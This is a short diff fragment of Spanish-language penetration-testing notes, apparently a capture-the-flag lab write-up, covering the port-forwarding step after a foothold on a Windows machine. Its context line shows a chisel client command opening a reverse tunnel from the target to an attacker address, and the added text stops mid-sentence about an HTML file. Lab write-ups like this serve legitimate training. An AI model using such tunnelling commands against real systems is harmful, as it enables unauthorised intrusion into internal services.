@@ -240,3 +240,6 @@ PS C:\tmp> .\chisel.exe client 10.10.14.8:9005 R:8000:127.0.0.1:8000
 en la web no vemos nada interesante sin embargo podemos investigar el directorio donde se esta ejecutando 
 ![[Pasted image 20240810174306.png]]
 
+`PortForwarding`
+ahora que ya tenemos la conexion y podemos ver la web en nuestra maquina local poremos hacer varias pruebas. lo primero que se me ocurre es crear un archivo html que nos permita establecer un 
+![[Pasted image 20240810175305.png]]
